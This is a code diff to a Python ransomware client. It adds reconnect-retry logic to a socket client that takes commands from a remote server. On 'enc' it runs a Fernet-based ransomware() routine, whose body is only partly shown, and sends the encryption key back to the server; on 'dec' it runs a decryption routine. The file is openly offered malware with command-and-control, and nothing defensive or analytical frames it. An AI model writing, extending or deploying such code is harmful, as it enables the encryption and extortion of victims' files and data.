@@ -1,6 +1,7 @@
-import os
+import os, sys
 from cryptography.fernet import Fernet
 import socket
+import time
 
 def ransomware():
     key = Fernet.generate_key()
@@ -53,27 +54,27 @@ def client():
     PORT = 65432
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
+        try:
+            s.connect((HOST, PORT))
+            print("Connected.")
+        except ConnectionRefusedError:
+            print("ConnectionRefusedError. After 10 seconds I try to connect again....")
+            time.sleep(10)
+            client()
+
         while True:
             x = s.recv(1024)
-            if not x:
-                continue
-
+            
             if x == b"enc":
-                key = ransomware()
-                s.sendall(key)
-                key = None
+                s.sendall(ransomware())
             elif x == b"dec":
                 while True:
                     key = s.recv(1024)
-                    if not x:
-                        continue
                     break
                 ransomware_solver(key)
-            elif x == b"close": break
-            elif x == b"exit": break
+                        
+            elif x == b"close" or x == b"exit": sys.exit("Remotely shut down by the server.")
 
             x = None
-
 
 client()
